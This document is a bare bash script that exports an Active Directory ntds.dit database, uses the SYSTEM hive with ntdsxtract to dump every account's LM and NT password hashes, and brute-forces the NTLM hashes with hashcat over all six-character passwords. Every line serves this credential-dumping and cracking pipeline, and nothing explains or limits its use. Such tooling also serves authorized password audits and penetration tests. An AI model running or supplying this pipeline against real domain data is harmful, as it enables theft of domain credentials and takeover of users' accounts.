#!/bin/bash
cd /bruteforce
tar xfv hashcat-2.00.tar.gz
tar xfv libesedb.tar.gz
cd libesedb-20160622/
./configure
make
make install
mv esedbtools/ /usr/local
ldconfig
esedbexport -t /bruteforce/ /bruteforce/ntds.dit
cd /bruteforce
unzip ntdsextract.zip
python ntdsxtract-master/dsusers.py /bruteforce/.export/datatable.4 /bruteforce/.export/link_table.7 /bruteforce --passwordhashes --pwdformat john --syshive /bruteforce/SYSTEM --lmoutfile LM.out --ntoutfile NT.out
python toHash.py > hash.txt
cd /bruteforce/hashcat-2.00/
./hashcat-cli64.bin -m 1000 /bruteforce/hash.txt -a 3 ?a?a?a?a?a?a -o brute-result.txt
